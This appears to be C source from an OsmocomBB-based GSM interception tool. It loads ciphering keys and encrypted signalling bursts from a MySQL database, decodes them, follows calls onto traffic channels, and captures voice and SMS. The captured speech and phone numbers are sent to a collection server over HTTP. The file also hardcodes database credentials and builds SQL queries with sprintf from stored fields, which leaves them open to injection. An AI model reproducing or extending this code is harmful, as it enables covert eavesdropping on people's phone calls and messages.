	char sql_cmd[1000] = {0};
	sprintf(sql_cmd , "SELECT * FROM `request_kc` WHERE Id = %u", id);
	if (mysql_query(con, sql_cmd)) {
		finish_with_error(con);
	}
	MYSQL_RES *result = mysql_store_result(con);
	if (result == NULL) {
		finish_with_error(con);
	}
	int num_fields = mysql_num_fields(result);
	MYSQL_ROW row;
	while ((row = mysql_fetch_row(result))) { 
		int i;
		char *token;
		
		memcpy(app_state.http_data.id, row[1], strlen(row[1]));
		LOGP(DRR, LOGL_NOTICE, "Id season: %s\n", app_state.http_data.id);
		if (row[2] != NULL){
			/* Decode base64 */
			char *ciphertext_sdcch = NULL;
			size_t len;
			LOGP(DRR, LOGL_NOTICE, "B64_sdcch_buff len: %u\n", strlen(row[2]));
			ciphertext_sdcch = b64_decode_ex(row[2], strlen(row[2]), &len);
			if (ciphertext_sdcch == NULL)
				LOGP(DRR, LOGL_NOTICE, "b64_decode false\n");
			LOGP(DRR, LOGL_NOTICE, "sdcch_buff len: %u\n", len);

			app_state.cipher_buffer = (struct l1ctl_burst_ind*) malloc(len);
			app_state.cipher_index = 0;
			struct l1ctl_burst_ind *bi = (struct l1ctl_burst_ind*) malloc(25);;
			while (len >=  sizeof(*bi)){
				memset(bi, 0, sizeof(*bi));
				memcpy(bi, ciphertext_sdcch, sizeof(*bi));
				memset(ciphertext_sdcch, 0, sizeof(*bi));
				ciphertext_sdcch =  ciphertext_sdcch + sizeof(*bi);
				len -= sizeof(*bi);
				memcpy(&(app_state.cipher_buffer[app_state.cipher_index]), bi, sizeof(*bi));
				app_state.cipher_index += 1;
			}
			LOGP(DRR, LOGL_NOTICE, "app_state.cipher_index: %u\n", app_state.cipher_index);
		} else {
			LOGP(DRR, LOGL_NOTICE, "Don't have sdcch data\n");
		}
		
		app_state.cell_id = atoi(row[3]);
		app_state.lac_id = atoi(row[4]);
		app_state.arfcn = atoi(row[5]);
		app_state.index_round = atoi(row[6]);
		if (row[6] != NULL){
			memcpy(app_state.local_addr_str , row[7], strlen(row[7]));
		}
		app_state.dch_ciph = atoi(row[8]);
		if (row[9] != NULL){
			memcpy(app_state.kc_str, row[9], strlen(row[9]));
			/* Convert kc_str to data */
			uint8_t len = HexToBin(app_state.kc_str, app_state.kc, GSM_KC_LEN * 10);
			if (len != GSM_KC_LEN)
				LOGP(DRR, LOGL_NOTICE, "Convert kc not success\n");
			else
				LOGP(DRR, LOGL_NOTICE, "Convert kc success\n");
		}
		app_state.is_catch_voice = atoi(row[10]);
		app_state.is_catch_sms = atoi(row[11]);
	}
	mysql_close(con);
	return 1;
}

static int insert_jump_event(uint16_t old_bcch_arfcn, uint16_t target_bcch_arfcn, uint16_t* ma, uint8_t ma_len, struct gsm48_chan_desc * chan_desc, uint8_t type) {
	MYSQL *con = mysql_init(NULL);
	char sql_cmd[1000] = {0};
	char ma_buf[100];
	char *ptr;
	int i, rc;
	
	/**
	 * Compose a sequence of channels (mobile allocation)
	 * FIXME: the length of a CTRL command is limited to 128 symbols,
	 * so we may have some problems if there are many channels...
	 */
	if (!ma_len)
		return -EINVAL;

	/**
	 * Compose a sequence of channels (mobile allocation)
	 * FIXME: the length of a CTRL command is limited to 128 symbols,
	 * so we may have some problems if there are many channels...
	 */
	for (i = 0, ptr = ma_buf; i < ma_len; i++) {
		/* Append a channel */
		rc = snprintf(ptr, ma_buf + sizeof(ma_buf) - ptr, "%u,", ma[i]);
		if (rc < 0)
			return rc;

		/* Move pointer */
		ptr += rc;

		/* Prevent buffer overflow */
		if (ptr >= (ma_buf + 100))
			return -EIO;
	}

	/* Overwrite the last space */
	*(ptr - 1) = '\0';

	if (con == NULL) {
		fprintf(stderr, "Init con false: %s\n", mysql_error(con));
		exit(1);
	}  

	if (mysql_real_connect(con, DATABASE_HOSTNAME, "netsharing", "12345678", "app_state", 0, NULL, 0) == NULL) {
	      finish_with_error(con);
	}
	if (old_bcch_arfcn == 0) 
		old_bcch_arfcn = target_bcch_arfcn;

	if (!chan_desc->h0.h)
		sprintf(sql_cmd, "INSERT INTO `rebuild_jump_event`(`Id_http`, `Source_c0`, `Source_fn`, `Voice_mode`, `Local_addr`, `Remote_addr`, `Kc`, `Dest_c0`, `Dest_tsc`, `Dest_ma_list`, `Dest_maio`, `Dest_hsn`, `Dest_chan_nr`, `State_process`, `Index_round`) VALUES (\"%s\", \"%u_%u_%u\", %u, %u, \"%s\", \"%s\", \"%s\", \"%u_0_0\", %u, \"%s\", %u, %u, %u, 2, %u)",
		app_state.http_data.id, app_state.arfcn, app_state.cell_id, app_state.lac_id, app_state.resync_message.fn, app_state.speed_mode, app_state.local_addr_str, app_state.phonenumber,app_state.kc_str, target_bcch_arfcn, chan_desc->h0.tsc, ma_buf, 0, 0, chan_desc->chan_nr, app_state.index_round);
	else
		sprintf(sql_cmd, "INSERT INTO `rebuild_jump_event`(`Id_http`, `Source_c0`, `Source_fn`, `Voice_mode`, `Local_addr`, `Remote_addr`, `Kc`, `Dest_c0`, `Dest_tsc`, `Dest_ma_list`, `Dest_maio`, `Dest_hsn`, `Dest_chan_nr`, `State_process`, `Index_round`) VALUES (\"%s\", \"%u_%u_%u\", %u, %u, \"%s\", \"%s\", \"%s\", \"%u_0_0\", %u, \"%s\", %u, %u, %u, 2, %u)",
		app_state.http_data.id, app_state.arfcn, app_state.cell_id, app_state.lac_id, app_state.resync_message.fn, app_state.speed_mode, app_state.local_addr_str, app_state.phonenumber, app_state.kc_str, target_bcch_arfcn, chan_desc->h1.tsc, ma_buf, chan_desc->h1.maio_low | (chan_desc->h1.maio_high << 2), chan_desc->h1.hsn, chan_desc->chan_nr, app_state.index_round);
	
	LOGP(DRR, LOGL_NOTICE, "Sql query: %s\n", sql_cmd);
	if (mysql_query(con, sql_cmd)) {
		finish_with_error(con);
	}
	mysql_close(con);
	return 1;
}

static int gsm48_rx_imm_ass(struct msgb *msg, struct osmocom_ms *ms) {
	uint16_t ma[64];
	struct gsm48_imm_ass *ia = msgb_l3(msg);
	uint8_t ch_type, ch_subch, ch_ts;
	static struct gsm48_imm_ass ia_prev;

	/* Discard packet TBF assignment */
	if (ia->page_mode & 0xf0)
		return 0;

	if (!(app_state.has_si1 && app_state.has_si3)) {
		LOGP(DRR, LOGL_NOTICE, "Not enough si1 and si3\n");
		return 0;
	}

	if ((ia->req_ref.ra != ia_prev.req_ref.ra)
			|| (ia->chan_desc.chan_nr != ia_prev.chan_desc.chan_nr)) {
		rsl_dec_chan_nr(ia->chan_desc.chan_nr, &ch_type, &ch_subch, &ch_ts);

		struct rx_meas_stat *meas = &ms->meas;
		uint32_t fn = meas->last_fn;
		/* Open db */
		if (!ia->chan_desc.h0.h) {
			/* Non-hopping */
			ma[0] = ia->chan_desc.h0.arfcn_low
					| (ia->chan_desc.h0.arfcn_high << 8);

			LOGP(DRR, LOGL_NOTICE,
					"GSM48 IMM ASS (ra=0x%02x, chan_nr=0x%02x, "
							"ARFCN=%u, TS=%u, SS=%u, TSC=%u, frame_nr=%d, ARFCN=%u, cell_id=%u, lac_id=%u)\n",
					ia->req_ref.ra, ia->chan_desc.chan_nr, ma[0], ch_ts,
					ch_subch, ia->chan_desc.h0.tsc, fn, app_state.arfcn,
					app_state.cell_id, app_state.lac_id);
		} else {
			/* Hopping */
			uint8_t maio, hsn, ma_len;
			uint16_t arfcn;
			int i, j, k;

			hsn = ia->chan_desc.h1.hsn;
			maio = ia->chan_desc.h1.maio_low
					| (ia->chan_desc.h1.maio_high << 2);
			ma_len = 0;

			for (i = 1, j = 0; i <= 1024; i++) {
				arfcn = i & 1023;
				if (app_state.cell_arfcns[arfcn].mask & 0x01) {
					k = ia->mob_alloc_len - (j >> 3) - 1;
					if (ia->mob_alloc[k] & (1 << (j & 7))) {
						ma[ma_len++] = arfcn;
					}
					j++;
				}
			}

			LOGP(DRR, LOGL_NOTICE,
					"GSM48 IMM ASS (ra=0x%02x, chan_nr=0x%02x, "
							"HSN=%u, MAIO=%u, TS=%u, SS=%u, TSC=%u, frame_nr=%d, ARFCN=%u, cell_id=%u, lac_id=%u)\n",
					ia->req_ref.ra, ia->chan_desc.chan_nr, hsn, maio, ch_ts,
					ch_subch, ia->chan_desc.h1.tsc, fn, app_state.arfcn,
					app_state.cell_id, app_state.lac_id);
		}
	}
	memcpy(&ia_prev, ia, sizeof(struct gsm48_imm_ass));
	return 0;
}

static const char *pag_print_mode(int mode) {
	switch (mode) {
	case 0:
		return "Normal paging";
	case 1:
		return "Extended paging";
	case 2:
		return "Paging reorganization";
	case 3:
		return "Same as before";
	default:
		return "invalid";
	}
}

static char *chan_need(int need) {
	switch (need) {
	case 0:
		return "any";
	case 1:
		return "sdch";
	case 2:
		return "tch/f";
	case 3:
		return "tch/h";
	default:
		return "invalid";
	}
}

static char *mi_type_to_string(int type) {
	switch (type) {
	case GSM_MI_TYPE_NONE:
		return "none";
	case GSM_MI_TYPE_IMSI:
		return "imsi";
	case GSM_MI_TYPE_IMEI:
		return "imei";
	case GSM_MI_TYPE_IMEISV:
		return "imeisv";
	case GSM_MI_TYPE_TMSI:
		return "tmsi";
	default:
		return "invalid";
	}
}

/**
 * This can contain two MIs. The size checking is a bit of a mess.
 */
static int gsm48_rx_paging_p1(struct msgb *msg, struct osmocom_ms *ms) {
	struct gsm48_paging1 *pag;
	int len1, len2, mi_type, tag;
	char mi_string[GSM48_MI_SIZE];

	/* is there enough room for the header + LV? */
	if (msgb_l3len(msg) < sizeof(*pag) + 2) {
		LOGP(DRR, LOGL_ERROR, "PagingRequest is too short.\n");
		return -1;
	}

	pag = msgb_l3(msg);
	len1 = pag->data[0];
	mi_type = pag->data[1] & GSM_MI_TYPE_MASK;

	if (msgb_l3len(msg) < sizeof(*pag) + 2 + len1) {
		LOGP(DRR, LOGL_ERROR, "PagingRequest with wrong MI\n");
		return -1;
	}

	if (mi_type != GSM_MI_TYPE_NONE) {
		gsm48_mi_to_string(mi_string, sizeof(mi_string), &pag->data[1], len1);
		LOGP(DRR, LOGL_NOTICE, "Paging1: %s chan %s to %s M(%s) \n",
		     pag_print_mode(pag->pag_mode),
		     chan_need(pag->cneed1),
		     mi_type_to_string(mi_type),
		     mi_string);
	}

	/* check if we have a MI type in here */
	if (msgb_l3len(msg) < sizeof(*pag) + 2 + len1 + 3)
		return 0;

	tag = pag->data[2 + len1 + 0];
	len2 = pag->data[2 + len1 + 1];
	mi_type = pag->data[2 + len1 + 2] & GSM_MI_TYPE_MASK;
	if (tag == GSM48_IE_MOBILE_ID && mi_type != GSM_MI_TYPE_NONE) {
		if (msgb_l3len(msg) < sizeof(*pag) + 2 + len1 + 3 + len2) {
			LOGP(DRR, LOGL_ERROR, "Optional MI does not fit here.\n");
			return -1;
		}

		gsm48_mi_to_string(mi_string, sizeof(mi_string), &pag->data[2 + len1 + 2], len2);
		LOGP(DRR, LOGL_NOTICE, "Paging2: %s chan %s to %s M(%s) \n",
		     pag_print_mode(pag->pag_mode),
		     chan_need(pag->cneed2),
		     mi_type_to_string(mi_type),
		     mi_string);
	}
	return 0;
}

static int gsm48_rx_paging_p2(struct msgb *msg, struct osmocom_ms *ms) {
	struct gsm48_paging2 *pag;
	int tag, len, mi_type;
	char mi_string[GSM48_MI_SIZE];

	if (msgb_l3len(msg) < sizeof(*pag)) {
		LOGP(DRR, LOGL_ERROR, "Paging2 message is too small.\n");
		return -1;
	}

	pag = msgb_l3(msg);
	LOGP(DRR, LOGL_NOTICE, "Paging1: %s chan %s to TMSI M(0x%x) \n",
		     pag_print_mode(pag->pag_mode),
		     chan_need(pag->cneed1), pag->tmsi1);
	LOGP(DRR, LOGL_NOTICE, "Paging2: %s chan %s to TMSI M(0x%x) \n",
		     pag_print_mode(pag->pag_mode),
		     chan_need(pag->cneed2), pag->tmsi2);

	/* no optional element */
	if (msgb_l3len(msg) < sizeof(*pag) + 3)
		return 0;

	tag = pag->data[0];
	len = pag->data[1];
	mi_type = pag->data[2] & GSM_MI_TYPE_MASK;

	if (tag != GSM48_IE_MOBILE_ID)
		return 0;

	if (msgb_l3len(msg) < sizeof(*pag) + 3 + len) {
		LOGP(DRR, LOGL_ERROR, "Optional MI does not fit in here\n");
		return -1;
	}

	gsm48_mi_to_string(mi_string, sizeof(mi_string), &pag->data[2], len);
	LOGP(DRR, LOGL_NOTICE, "Paging3: %s chan %s to %s M(%s) \n",
	     pag_print_mode(pag->pag_mode),
	     "n/a ",
	     mi_type_to_string(mi_type),
	     mi_string);

	return 0;
}

static int gsm48_rx_paging_p3(struct msgb *msg, struct osmocom_ms *ms) {
	struct gsm48_paging3 *pag;

	if (msgb_l3len(msg) < sizeof(*pag)) {
		LOGP(DRR, LOGL_ERROR, "Paging3 message is too small.\n");
		return -1;
	}

	pag = msgb_l3(msg);
	LOGP(DRR, LOGL_NOTICE, "Paging1: %s chan %s to TMSI M(0x%x) \n",
		     pag_print_mode(pag->pag_mode),
		     chan_need(pag->cneed1), pag->tmsi1);
	LOGP(DRR, LOGL_NOTICE, "Paging2: %s chan %s to TMSI M(0x%x) \n",
		     pag_print_mode(pag->pag_mode),
		     chan_need(pag->cneed2), pag->tmsi2);
	LOGP(DRR, LOGL_NOTICE, "Paging3: %s chan %s to TMSI M(0x%x) \n",
		     pag_print_mode(pag->pag_mode),
		     "n/a ", pag->tmsi3);
	LOGP(DRR, LOGL_NOTICE, "Paging4: %s chan %s to TMSI M(0x%x) \n",
		     pag_print_mode(pag->pag_mode),
		     "n/a ", pag->tmsi4);

	return 0;
}

/* Dummy Paging Request 1 with "no identity" */
static const uint8_t paging_fill[] = {
	0x15, 0x06, 0x21, 0x00, 0x01, 0xf0, 0x2b,
	/* The rest part may be randomized */
};

/* LAPDm func=UI fill frame (for the BTS side) */
static const uint8_t lapdm_fill[] = {
	0x03, 0x03, 0x01, 0x2b,
	/* The rest part may be randomized */
};

static bool is_fill_frame(struct msgb *msg) {
	size_t l2_len = msgb_l3len(msg);
	uint8_t *l2 = msgb_l3(msg);

	OSMO_ASSERT(l2_len == GSM_MACBLOCK_LEN);

	if (!memcmp(l2, paging_fill, sizeof(paging_fill)))
		return true;
	if (!memcmp(l2, lapdm_fill, sizeof(lapdm_fill)))
		return true;

	return false;
}

int gsm48_rx_ccch(struct msgb *msg, struct osmocom_ms *ms) {
	struct gsm48_system_information_type_header *sih = msgb_l3(msg);
	int rc = 0;

	/* Skip dummy (fill) frames */
	if (is_fill_frame(msg))
		return 0;

	if (sih->rr_protocol_discriminator != GSM48_PDISC_RR)
		LOGP(DRR, LOGL_ERROR, "PCH pdisc (%s) != RR\n",
			gsm48_pdisc_name(sih->rr_protocol_discriminator));

	switch (sih->system_information) {
	case GSM48_MT_RR_PAG_REQ_1:
		// gsm48_rx_paging_p1(msg, ms);
		break;
	case GSM48_MT_RR_PAG_REQ_2:
		// gsm48_rx_paging_p2(msg, ms);
		break;
	case GSM48_MT_RR_PAG_REQ_3:
		// gsm48_rx_paging_p3(msg, ms);
		break;
	case GSM48_MT_RR_IMM_ASS:
		// gsm48_rx_imm_ass(msg, ms);
		break;
	case GSM48_MT_RR_NOTIF_NCH:
		/* notification for voice call groups and such */
		break;
	case 0x07:
		/* wireshark know that this is SI2 quater and for 3G interop */
		break;
	default:
		LOGP(DRR, LOGL_NOTICE, "Unknown PCH/AGCH message "
			"(type 0x%02x): %s\n", sih->system_information,
			msgb_hexdump_l3(msg));
		rc = -EINVAL;
	}

	return rc;
}

int gsm48_rx_bcch(struct msgb *msg, struct osmocom_ms *ms) {
	/* FIXME: we have lost the gsm frame time until here, need to store it
	 * in some msgb context */
	//dump_bcch(dl->time.tc, ccch->data);
	dump_bcch(ms, 0, msg->l3h);

	return 0;
}

void l23_update_kc(char *buffer){
}

static struct osmo_timer_list updconfig_timer;
static void start_updconfig_timer(int sec, int micro);
static void timeout_updconfig_cb(void *arg);
static void stop_updconfig_timer(void);


static void timeout_updconfig_cb(void *arg) {
	watch_dog += 1;
	LOGP(DSUM, LOGL_NOTICE, "Timeout_updconfig_cb -- ccch_quit: %d, watchdog counter: %d\n", ccch_quit, watch_dog);
	if (watch_dog >= 25) {
		LOGP(DSUM, LOGL_NOTICE, "Quit by watchdog\n");
		ccch_quit = 2;
	}
	if (ccch_quit == 2){
		stop_updconfig_timer();
		/* Close file log */
		close(fp);
		quit = 1;
		return;
	}
	start_updconfig_timer(1,0);
}

static void start_updconfig_timer(int sec, int micro) {
	stop_updconfig_timer();
	updconfig_timer.cb = timeout_updconfig_cb;
	updconfig_timer.data = NULL;
	osmo_timer_schedule(&updconfig_timer, sec, micro);
}

static void stop_updconfig_timer(void) {
	if (osmo_timer_pending(&updconfig_timer))
		osmo_timer_del(&updconfig_timer);
}

static void layer3_rx_burst(struct osmocom_ms *ms, struct msgb *msg) {
	struct l1ctl_burst_ind *bi;
	int ul = 0, i;
	uint16_t arfcn;
	int rx_dbm;

	/* Receive burst, reset watchdog */
	watch_dog = 0;

	bi = (struct l1ctl_burst_ind *) msg->l1h;
	arfcn = ntohs(bi->band_arfcn);
	ul = !!(arfcn & ARFCN_UPLINK);
	rx_dbm = rxlev2dbm(bi->rx_level);

	if (app_state.dch_nr == bi->chan_nr) {
		local_burst_decode(ms, bi);

		/* Check for channel end */
		if (app_state.dch_badcnt >= TCH_MAX_BADCNT_RELEASE){
			if (ccch_quit != 0)
				return;
			ccch_quit = 1;
			/* Send http_data */
			LOGP(DRR, LOGL_NOTICE, "The Dedicate Channel is released because of bad SNR!\n");
			app_state.http_data.arfcn = app_state.arfcn;
			app_state.http_data.cell_id = app_state.cell_id;
			app_state.http_data.lac = app_state.lac_id;
			app_state.http_data.type = GSM_TYPE_SPEECH;
			os_http_clear_buffer(app_state.http_data.speech.remote_addr);
			evbuffer_add_printf(app_state.http_data.speech.remote_addr, "%s", app_state.phonenumber);
			os_http_clear_buffer(app_state.http_data.speech.local_addr);
			evbuffer_add_printf(app_state.http_data.speech.local_addr, "%s", app_state.local_addr_str);
			app_state.http_data.speech.dch_ciph = app_state.dch_ciph;
			app_state.http_data.cell_id = app_state.cell_id;
			app_state.http_data.lac = app_state.lac_id;
			app_state.http_data.speech.speed_mode = app_state.speed_mode;
			if (is_offline_mode) {
				app_state.http_data.speech.is_end_part = 0;
				/* Push database current info */
				LOGP(DRR, LOGL_NOTICE, "Offline mode, send info lost channel to database\n");
				insert_rebuild_jump_event();
			} else {
				app_state.http_data.speech.is_end_part = 1;
			}

			for (i = 0; i < sys.workers[sys.id].http_retries; i++) {
				if (os_http_client_sendreq(&app_state.http_data) == 0) {
					os_http_clear_buffer(app_state.http_data.speech.speech_data);
					app_state.http_data.speech.last_send_time = time(NULL);
					app_state.http_data.speech.current_part++;
					break;
				}
			}
		}
	}
}

static int process_request_kc_id(struct osmocom_ms *ms, uint32_t id){
	int i;
	get_params_from_request_kc(id);
	/* Decode cached buffer */
	for (i = 0; i < app_state.cipher_index; i++){
		local_burst_decode(ms, &app_state.cipher_buffer[i]);
	}
	parser_ass_command(ms);

	/* Check SMS */
	if (app_state.has_jump_channel == 0) {
		if (app_state.http_data.type == GSM_TYPE_VOICE && app_state.is_catch_sms == 1) {
			LOGP(DRR, LOGL_NOTICE, "Update type http_data type SMS, id: %s\n", app_state.http_data.id);
			ccch_quit = 1;
			os_http_client_update_type(app_state.http_data.id, GSM_TYPE_SMS);
		}
		ccch_quit = 2;
	} 

	if (app_state.is_catch_voice == 0) {
		ccch_quit = 2;
	}

	/* Jump channel from resync message */
	if (app_state.has_jump_channel == 2){
		LOGP(DRR, LOGL_NOTICE, "Receive join tch channel by handover\n");
		memset(app_state.HandoverBuffer, 0, sizeof(app_state.HandoverBuffer));
		app_state.Handover_readyState = 0;
		app_state.Handover_Index = 0;
		app_state.Handover_NR = 0;
		app_state.Handover_NS = 0;
		app_state.HandoverFn = 0;
	}

	if (app_state.has_jump_channel == 1){
		LOGP(DRR, LOGL_NOTICE, "Receive join tch channel by assignment command\n");
		memset(app_state.AssignCMDBuffer, 0 , sizeof(app_state.AssignCMDBuffer));
		app_state.AssignCMD_readyState = 0;
		app_state.rxAssignCMD_cnt = 0;
		app_state.AssignCMDBufIndex = 0;
		app_state.AssignCMD_NR = 0;
		app_state.AssignCMD_NS = 0;
		app_state.AssignFn = 0;
	}

	app_state.dch_nr = app_state.resync_message.chan_desc.chan_nr;

	/* Jump chan */
	jump_to_tch_channel(ms, &app_state.resync_message.chan_desc, app_state.resync_message.ma, app_state.resync_message.ma_len, app_state.resync_message.bcch_arfcn, app_state.resync_message.old_bcch_arfcn, app_state.cell_id, app_state.lac_id, app_state.resync_message.fn);
	app_state.arfcn = app_state.resync_message.bcch_arfcn;
	return 0;
}

static int get_params_from_rebuild(uint32_t id) {
	MYSQL *con = mysql_init(NULL);
	if (con == NULL) {
		fprintf(stderr, "mysql_init() failed\n");
		exit(1);
	}

	if (mysql_real_connect(con, DATABASE_HOSTNAME, "netsharing", "12345678", "app_state", 0, NULL, 0) == NULL) {
	      finish_with_error(con);
	}

	char query[1000] = {0};
	sprintf(query, "SELECT * FROM `rebuild_jump_event` WHERE Id = %u", id);
	if (mysql_query(con, query)) {
		finish_with_error(con);
	}
	MYSQL_RES *result = mysql_store_result(con);
	if (result == NULL) {
		finish_with_error(con);
	}
	int num_fields = mysql_num_fields(result);
	MYSQL_ROW row;
	while ((row = mysql_fetch_row(result))) {
		struct gsm48_chan_desc chan_desc;
		char ma_str[1000] = {0};
		char c0_info_str[1000] = {0};
		char *token;
		uint16_t c0_info[10] = {0};
		uint16_t i, cx, len=0;
		uint8_t maio, temp_speed_mode;

		memcpy(app_state.http_data.id, row[1], strlen(row[1]));
		LOGP(DRR, LOGL_NOTICE, "Id season: %s\n", app_state.http_data.id);

		/* Get index round */
		app_state.index_round = atoi(row[3]);

		/* Get voice mode */
		temp_speed_mode = atoi(row[5]);
		if (temp_speed_mode == 0) {
			/* Need set flag find speed mode on server */
			app_state.http_data.need_find_speed = 1;
		} else {
			app_state.http_data.need_find_speed = 0;
		}
		app_state.speed_mode = atoi(row[5]);

		/* Get local, remote addr */
		memcpy(app_state.local_addr_str, row[6], strlen(row[6]));
		memcpy(app_state.phonenumber, row[7], strlen(row[7]));

		/* Get kc */
		if (strlen(row[8]) != 0) {
			/* Cipher mode */
			app_state.dch_ciph = 1;
			app_state.has_cipher_cmd = 1;
			memcpy(app_state.kc_str, row[8], strlen(row[8]));
			/* Convert kc_str to data */
			uint8_t len = HexToBin(app_state.kc_str, app_state.kc, GSM_KC_LEN * 10);
			if (len != GSM_KC_LEN)
				LOGP(DRR, LOGL_NOTICE, "Convert kc not success\n");
			else
				LOGP(DRR, LOGL_NOTICE, "Convert kc success\n");
		} else {
			/* Non cipher mode */
			app_state.dch_ciph = 0;
		}

		/* Get cell_id, lac_id */
		memcpy(c0_info_str, row[9], strlen(row[9]));
		token = strtok(c0_info_str, "_");
		while (token != NULL){
			c0_info[len] = atoi(token);
			len++;
			token = strtok(NULL, "_");
		}
		app_state.arfcn = c0_info[0];
		app_state.resync_message.bcch_arfcn = c0_info[0];
		app_state.cell_id = c0_info[1];
		app_state.lac_id = c0_info[2];

		/* Get ma list */
		memcpy(ma_str, row[11], strlen(row[11]));
		app_state.resync_message.ma_len = 0;
		token = strtok(ma_str, ",");
		while (token != NULL){
			cx = atoi(token);
			app_state.resync_message.ma[app_state.resync_message.ma_len] = cx;
			app_state.resync_message.ma_len++;
			token = strtok(NULL, ",");
		}

		app_state.resync_message.chan_desc.chan_nr = atoi(row[14]);
		/* Check h0 h1 by ma len */
		if (app_state.resync_message.ma_len == 0) {
			/* h0 no hopping */
			app_state.resync_message.chan_desc.h0.h = 0;
			app_state.resync_message.chan_desc.h0.tsc = atoi(row[10]);
		} else {
			/* h1 hopping */
			app_state.resync_message.chan_desc.h0.h = 1; // Set by pass condition in func jump_to_tch_channel
			app_state.resync_message.chan_desc.h1.hsn = atoi(row[13]);
			app_state.resync_message.chan_desc.h1.tsc = atoi(row[10]);
			maio = atoi(row[12]);
			app_state.resync_message.chan_desc.h1.maio_high = (maio >> 2) & 0xff;
			app_state.resync_message.chan_desc.h1.maio_low = maio & 0xff;
		}

		/* Get frame number */
		app_state.resync_message.fn = atoi(row[15]);
		LOGP(DRR, LOGL_NOTICE, "Dest frame number: %lu\n", app_state.resync_message.fn);
	}
	mysql_close(con);
	return 1;
}

static int process_rebuild_id(struct osmocom_ms *ms, uint32_t id) {
	/* Get info from database */
	get_params_from_rebuild(id);
	app_state.http_data.type = GSM_TYPE_VOICE; // Only voice
	app_state.dch_nr = app_state.resync_message.chan_desc.chan_nr;
	/* Jump channel */
	jump_to_tch_channel(ms, &app_state.resync_message.chan_desc, app_state.resync_message.ma, app_state.resync_message.ma_len, app_state.resync_message.bcch_arfcn, app_state.resync_message.old_bcch_arfcn, app_state.cell_id, app_state.lac_id, app_state.resync_message.fn);

}

void layer3_app_reset(void) {
}

static int signal_cb(unsigned int subsys, unsigned int signal, void *handler_data, void *signal_data) {
	struct osmocom_ms *ms;
    struct osmobb_msg_ind *mi;

	if (subsys != SS_L1CTL)
		return 0;

	switch (signal) {
    case S_L1CTL_BURST_IND:
		mi = signal_data;
		layer3_rx_burst(mi->ms, mi->msg);
		break;
	case S_L1CTL_RESET:
		LOGP(DRR, LOGL_NOTICE, "Signal_cb receive S_L1CTL_RESET\n");
		ms = signal_data;
		layer3_app_reset();
		return l1ctl_tx_fbsb_req(ms, ms->test_arfcn,
		                         L1CTL_FBSB_F_FB01SB, 100, 0,
		                         CCCH_MODE_NONE, dbm2rxlev(-85));
		break;
	case S_L1CTL_CELL_LAC_INFO:
		{
			struct l1ctl_cell_lac_info *cell_lac_info = signal_data;
			app_state.cell_id = cell_lac_info->cell_id;
			app_state.lac_id = cell_lac_info->lac_id;
			LOGP(DRR, LOGL_NOTICE, "Signal_cb receive S_L1CTL_CELL_LAC_INFO cell id: %u, lac id: %u\n", app_state.cell_id, app_state.lac_id);
			break;
		}
	}
	return 0;
}

static int app_exit (struct osmocom_ms *ms) {
	LOGP(DRR, LOGL_NOTICE, "APP EXIT\n");
	os_http_client_cleanup();
	os_http_free_http_data(&app_state.http_data);
}

int l23_app_init(struct osmocom_ms *ms)
{
	// l23_app_exit = app_exit;
	osmo_signal_register_handler(SS_L1CTL, &signal_cb, NULL);
	layer3_init(ms);

	os_http_init_data(&app_state.http_data, &sys);

	/* Init default value for app_state */
	app_state.http_data.type = GSM_TYPE_VOICE;
	app_state.ms = ms;

	/* Init timer */
	start_updconfig_timer(1,0);

	if (id_rebuild_jump_event > 0) {
		process_rebuild_id(ms, id_rebuild_jump_event);
		app_state.need_push_event = 1;
	} else {
		app_state.need_push_event = 1;
		process_request_kc_id(ms, d_h);
	}
	return 0;
}

static struct l23_app_info info = {
	.copyright	= "Copyright (C) 2010 Harald Welte <laforge@gnumonks.org>\n",
	.contribution	= "Contributions by Holger Hans Peter Freyther\n",
};

struct l23_app_info *l23_app_info()
{
	return &info;
}
